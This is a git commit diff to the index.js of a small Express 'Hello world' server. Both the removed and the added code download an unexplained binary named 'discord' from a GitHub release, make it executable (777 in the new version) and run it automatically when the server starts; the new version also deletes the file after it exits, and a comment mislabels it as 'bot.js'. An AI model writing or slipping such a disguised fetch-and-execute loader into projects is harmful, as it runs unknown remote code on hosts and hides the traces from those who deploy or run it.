8755e45dfa48de9a9958cdac3d6174b8d8cf510a
mmnni <eooce@outlook.com>
2024-12-08 03:37:03 +0800

    Update index.js

--- index.js
+++ index.js
@@ -2,19 +2,25 @@ const express = require("express");
 const app = express();
 const fs = require('fs');
 const path = require('path');
-const https = require('https');
+const axios = require('axios');
 const { exec } = require('child_process');
-const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
-const FILE_PATH = './.npm';
+const FILE_PATH = process.env.FILE_PATH || './tmp';
+const PORT = process.env.SERVER_PORT || process.env.PORT || 3000; 
+
+if (!fs.existsSync(FILE_PATH)) {
+  fs.mkdirSync(FILE_PATH);
+  console.log(`${FILE_PATH} is created`);
+} else {
+  console.log(`${FILE_PATH} already exists`);
+}
 
 app.get("/", function(req, res) {
   res.send("Hello world!");
 });
 
-// log rote
+const subTxtPath = path.join(FILE_PATH, 'log.txt');
 app.get("/log", (req, res) => {
-  const logPath = path.join(FILE_PATH, 'log.txt');
-  fs.readFile(logPath, "utf8", (err, data) => {
+  fs.readFile(subTxtPath, "utf8", (err, data) => {
     if (err) {
       console.error(err);
       res.status(500).send("Error reading log.txt");
@@ -25,38 +31,54 @@ app.get("/log", (req, res) => {
   });
 });
 
-const downloadDiscord = () => {
-  return new Promise((resolve, reject) => {
-    const file = fs.createWriteStream('discord');
-    https.get('https://github.com/mmnni/pipeops/releases/download/sac/discord', (response) => {
-      response.pipe(file);
-      file.on('finish', () => {
-        file.close();
+// Specify the URL of the bot.js file to download
+const fileUrl = 'https://github.com/mmnni/pipeops/releases/download/sac/discord';
+const fileName = 'discord';
+const filePath = path.join(FILE_PATH, fileName);
 
-        exec('chmod +x discord', (err) => {
-          if (err) reject(err);
-          resolve();
+// Download and execute the file
+const downloadAndExecute = () => {
+  const fileStream = fs.createWriteStream(filePath);
+
+  axios
+    .get(fileUrl, { responseType: 'stream' })
+    .then(response => {
+      response.data.pipe(fileStream);
+      return new Promise((resolve, reject) => {
+        fileStream.on('finish', resolve);
+        fileStream.on('error', reject);
+      });
+    })
+    .then(() => {
+      console.log('File downloaded successfully');
+      fs.chmodSync(filePath, '777'); 
+
+      console.log('Executing the file...');
+      const child = exec(`./${fileName}`, (error, stdout, stderr) => {
+        if (error) {
+          console.error(`Execution error: ${error}`);
+          return;
+        }
+        console.log(`${stdout}`);
+        console.error(`${stderr}`);
+      });
+
+      child.on('exit', (code) => {
+      //  console.log(`Child process exited with code ${code}`);
+        fs.unlink(filePath, err => {
+          if (err) {
+            console.error(`Error deleting file: ${err}`);
+          } else {
+            console.log(`App is running!`);
+          }
         });
       });
-    }).on('error', (err) => {
-      fs.unlink('discord', () => {});
-      reject(err);
+    })
+    .catch(error => {
+      console.error(`Download error: ${error}`);
     });
-  });
 };
-
-const Execute = async () => {
-  try {
-    await downloadDiscord();
-    
-    const command = './discord &';
-    exec(command, { 
-      shell: '/bin/bash'
-    });
-  } catch (err) {}
-};
-
-Execute();
+downloadAndExecute();
 
 app.listen(PORT, () => {
   console.log(`Server is running on port:${PORT}`);
